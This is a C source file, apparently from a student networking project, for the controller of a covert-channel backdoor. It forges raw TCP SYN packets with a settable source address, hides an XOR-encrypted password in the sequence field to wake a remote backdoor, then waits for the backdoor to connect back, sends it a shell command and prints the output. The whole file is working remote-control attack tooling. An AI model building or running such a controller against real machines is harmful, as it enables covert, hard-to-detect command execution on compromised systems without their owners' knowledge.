#include "controller.h"
#define COPTIONS		"?s:p:d:q:c:"

int main(int argc, char *argv[])
{
	AddrInfo *Addr_Ptr;
	char*	commandToRun = NULL;
	int 	opt;
	
	 if (argc < 2)
    {
	usage(argv);
    }
    
    if ((Addr_Ptr = malloc (sizeof (AddrInfo))) == NULL)
    {
	perror ("malloc");
	exit (1);
    }
    
    Addr_Ptr->SrcHost = GetIPAddress ();
    Addr_Ptr->DstHost = NULL;
    Addr_Ptr->dport = 10022;		// Default Destination Port
    Addr_Ptr->sport = rand()% 40000 + 2000;
    
	//Get our operator that have been passed in
	while ((opt = getopt(argc, argv, COPTIONS)) != -1)
	{
		switch (opt)
		{
			case 's':
				Addr_Ptr->SrcHost = optarg;
				break;

			case 'p':
				Addr_Ptr->sport = atoi(optarg);
				break;

			case 'd':
				Addr_Ptr->DstHost = resolve_host (optarg);
				break;
			
			case 'q':
				Addr_Ptr->dport = atoi(optarg);
				break;
			
			case 'c':
				commandToRun = optarg;
				break;
			
			default:
				case '?':
					usage(argv);
		}
	}
	
	if (Addr_Ptr->DstHost == NULL) {
		usage (argv);
	} else if (commandToRun == NULL) {
		usage (argv);
	}
	
	//Create a raw socket
    Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    
    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int one = 1;
	const int *val = &one;
    if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, val, sizeof (one)) == -1) {
		fprintf(stderr, "setsockopt");
	}
	
	    /* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        fprintf(stderr, "You need to be root for this");
    }
	sendPasswordToBackdoor((void*)Addr_Ptr, commandToRun);
	return 0;
}

void sendPasswordToBackdoor(void *addr_ptr, char *command) 
{
	char buffer[PKT_SIZE];
	struct iphdr *iph = (struct iphdr *) buffer;
    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof (struct ip));
    AddrInfo *UserAddr = (AddrInfo *)addr_ptr;
	struct sockaddr_in 	sin;
	pseudo_header psh;
	char *encryptedPass = NULL;
	char *key = NULL;
	char *pass = NULL;
	
	memset (buffer, 0, PKT_SIZE);
	
	sin.sin_family = AF_INET;
    sin.sin_port = htons (UserAddr->dport);
    sin.sin_addr.s_addr = inet_addr (UserAddr->DstHost); 
	
	iph->ihl 		= 5;
    iph->version 	= 4;
    iph->tos 		= 0;
	iph->tot_len 	= sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id 		= htonl (rand()%65354);
	iph->frag_off 	= 0;
	iph->ttl 		= 128;
	iph->protocol 	= IPPROTO_TCP;
	iph->check 		= 0;
	iph->saddr 		= inet_addr (UserAddr->SrcHost); 
	iph->daddr 		= sin.sin_addr.s_addr;
 
	iph->check 		= in_cksum((unsigned short *) buffer, iph->tot_len >> 1);
    
	tcph->source = htons (UserAddr->sport); // TCP source port
	tcph->dest = htons (UserAddr->dport);
    tcph->seq = rand()%RAND_MAX;
	tcph->ack_seq = 0;	
	tcph->doff = 5;
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (rand()% 4000 + 1024);
	tcph->check = 0;
    tcph->urg_ptr = 0;
    
    key = strdup(encryptKey);
	pass = strdup(password);
	encryptedPass = xor_encrypt(key, pass);
	memcpy(buffer + sizeof(struct ip) + 4, encryptedPass, sizeof(__uint32_t));
    
    // calcluate the IP checksum
	psh.source_address = inet_addr(UserAddr->SrcHost);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = in_cksum( (unsigned short*) &psh , sizeof (pseudo_header));
	
	{
		int one = 1;
		const int *val = &one;
		if (setsockopt (UserAddr->RawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
		perror ("setsockopt");
	}
    
   //Send the packet
	if (sendto (UserAddr->RawSocket, buffer, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
	{
			fprintf(stderr, "sendto");
			return;
	}
    //Close the socket and wait for the backdoor to respnd to us if we had the right password
    //close(send_socket);
	
	if(sendCommands(UserAddr->sport, command) != 0)
	{
		fprintf(stderr, "sendCommand() failed");
        return;
	}
	
}

int sendCommands(int sourcePort, char* command)
{
	int	new_sd = 0, commandSocket = 0;
	socklen_t client_len;
	struct sockaddr_in client;
	struct sockaddr_in	commandAddr;
	//int bytes_to_read = 0;
	//char *bp = NULL;
   // char buffer[100];
	
	  // Create a stream socket
	if ((commandSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		fprintf(stderr, "Can't create a socket");
		return -1;
	}
	
	bzero((char *)&commandAddr, sizeof(struct sockaddr_in));
	commandAddr.sin_family = AF_INET;
	commandAddr.sin_port = htons(sourcePort);
	commandAddr.sin_addr.s_addr = htonl(INADDR_ANY); // Accept connections from any client

	if (bind(commandSocket, (struct sockaddr *)&commandAddr, sizeof(commandAddr)) == -1)
	{
		fprintf(stderr, "Can't bind name to socket");
		return -1;
	}
	
	listen(commandSocket, 5);
	
	client_len = sizeof(client);
	
	if ((new_sd = accept (commandSocket, (struct sockaddr *)&client, &client_len)) == -1)
	{
		fprintf(stderr, "Can't accept client\n");
		return -1;
	}
	
	// send command
	send(new_sd, command, 100, 0);
    
    //receive response
    //bp = buffer;
    //bytes_to_read = 100;
    
    while(1)
    {
		ssize_t count;
		char buf[80];
		count = recv(new_sd, buf, sizeof buf, 0);
		if (count == -1) {
			break;
		} else if (count == 0) {
			break;
		} else {
			printf("%s",buf);
		}
    }
    
    close(new_sd);
    close(commandSocket);
	return 0;
}


/*
 * This function was taken from Craig Rowland's 1996 article on Covert 
 * Channels titled "Covert Channels in the TCP/IP Protocol Suite"*/
unsigned int host_convert(char *hostname) {
	static struct in_addr i;
	struct hostent *h;
	i.s_addr = inet_addr(hostname);
	if(i.s_addr == -1) {
		h = gethostbyname(hostname);
		if(h == NULL) {
			fprintf(stderr, "cannot resolve %s\n", hostname);
			exit(0);
		}
		bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
	}
	return i.s_addr;
}

/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
	register long		sum;
	/* assumes long == 32 bits */
	u_short			oddbyte;
	register u_short	answer;
	/* assumes u_short == 16 bits */
	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	/* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;
		/* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;
		/* one byte only */
		sum += oddbyte;
	}
	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */
	sum  = (sum >> 16) + (sum & 0xffff);
	/* add high-16 to low-16 */
	sum += (sum >> 16);
	/* add carry */
	answer = ~sum;
	/* ones-complement, then truncate to 16 bits */
	return(answer);
}

/*-----------------------------------------------------------------------------------------------
--
--	Function:	This function resolves and IP or Hostname supplied by user
--
--	Interface:	char * resolve_host (const char *host)
--
--				const char *host - a pointer to a string containing and IP address
--						   or a hostname. 
--	Returns:	A string containing the IP address 
--
--	Date:		June 3, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	The function receives a string containing an IP address or a hostname and uses the 
--	getaddrinfo function to resolve it into an IP address. The function can resolve 
--	both IPv4 and IPv6 addresses.
-- 	
--	
-------------------------------------------------------------------------------------------------*/

char * resolve_host (const char *host)
{
    struct addrinfo hints, *res;
    int errcode;
    static char addrstr[100];
    void *ptr;

    memset (&hints, 0, sizeof (hints));
    hints.ai_family = PF_UNSPEC;	// Handle IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags |= AI_CANONNAME;
    
    errcode = getaddrinfo (host, NULL, &hints, &res);
    if (errcode != 0)
    {
	perror ("getaddrinfo");
	return NULL;
    }
    
    while (res)
    {
	inet_ntop (res->ai_family, res->ai_addr->sa_data, addrstr, 100);

	switch (res->ai_family)
        {
	    case AF_INET:
	      ptr = &((struct sockaddr_in *) res->ai_addr)->sin_addr;
	    break;
	    case AF_INET6:
	      ptr = &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr;
	    break;
        }
	inet_ntop (res->ai_family, ptr, addrstr, 100);
	printf ("IPv%d address: %s (%s)\n", res->ai_family == PF_INET6 ? 6 : 4,
              addrstr, res->ai_canonname);
	res = res->ai_next;
    }
    return addrstr;
}

/*-----------------------------------------------------------------------------------------------
--
--	Function:	This function gets the IP address bound to an active NIC
--
--	Interface:	char * GetIPAddress (void)
--
--				
--	Returns:	A string containing the IP address bound to the first active NIC 
--
--	Date:		June 3, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function uses the pcap_lookupdev to obtain address of the first active NIC.
--	The ioctl function is used to obtain the IP address of the active NIC.
-- 	
--	
-------------------------------------------------------------------------------------------------*/

char * GetIPAddress (void)
{
	pcap_if_t *all_dev, *d;
	int sd;
 	struct sockaddr_in *addrp;
	struct ifreq ifrcopy;
	char *interface, *ip_addr;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 netp;
    bpf_u_int32 maskp;
	
	
	if ((sd = socket( PF_INET, SOCK_DGRAM, 0 )) < 0)
 	{
  		printf("Cannot create socket :%s\n", strerror(errno));
  		return (NULL);
 	}
	
	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
	//Find a suitable nic from the device list
    for (d = all_dev; d; d = d->next)
    {
		if (d->addresses != NULL)
		{
			break;
		}
    }
	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (d->name, &netp, &maskp, errbuf);
	// Get the first active NIC
	interface = d->name;
	printf("NIC: %s\n", interface);
	if(interface == NULL)
	{ 
	    fprintf(stderr,"%s\n",errbuf); 
	    exit(1); 
	}

 	memset (&ifrcopy,0,sizeof( struct ifreq ) );
 	strncpy (ifrcopy.ifr_name, interface, IFNAMSIZ); //IFNAMSIZ is defined in "if.h"

 	if( ioctl (sd, SIOCGIFADDR, &ifrcopy) < 0 )
 	{
  		printf("Cannot obtain IP address of '%s' :%s\n", interface, strerror(errno));
  		close(sd);
  		return (NULL);
 	}
 	else
	{
		addrp = (struct sockaddr_in *)&(ifrcopy.ifr_addr);
		ip_addr = inet_ntoa(addrp->sin_addr);
	}
	close(sd);
 	return (ip_addr);
  
}

// Usage Message
void usage (char **argv)
{
      fprintf(stderr, "Usage: %s -s <Source IP Address> -p <Source Port> -d <Destination IP Address> -q <Destination Port> -c <Command To Run>\n", argv[0]);
      fprintf(stderr, "Example: %s -s 192.168.0.15 -p 10022 -d 192.168.0.14 -q 10022 -c ls\n", argv[0]);
      exit(1);
}
